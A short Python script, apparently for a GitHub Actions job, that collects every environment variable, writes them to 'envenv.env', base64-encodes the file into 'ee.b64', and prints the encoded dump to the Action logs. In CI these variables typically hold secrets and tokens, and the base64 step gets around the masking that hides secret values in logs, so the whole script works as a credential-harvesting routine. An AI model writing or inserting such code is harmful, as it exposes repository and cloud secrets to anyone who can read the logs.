import os
import base64

# 1. Gather all environment variables and format them as KEY=VALUE
env_data = ""
for key, value in os.environ.items():
    env_data += f"{key}={value}\n"

# 2. Write the string data to 'envenv.env'
env_filename = "envenv.env"
with open(env_filename, "w", encoding="utf-8") as env_file:
    env_file.write(env_data)

# 3. Read the file back as bytes and base64 encode it
b64_filename = "ee.b64"
with open(env_filename, "rb") as env_file_bytes:
    # Encode the raw bytes to base64 bytes, then decode to a string
    encoded_bytes = base64.b64encode(env_file_bytes.read())
    encoded_string = encoded_bytes.decode("utf-8")

# 4. Save the base64 string to 'ee.b64'
with open(b64_filename, "w", encoding="utf-8") as b64_file:
    b64_file.write(encoded_string)

# 5. Print the base64 string directly to the GitHub Action logs
print("--- START OF BASE64 ENV DUMP ---")
print(encoded_string)
print("--- END OF BASE64 ENV DUMP ---")
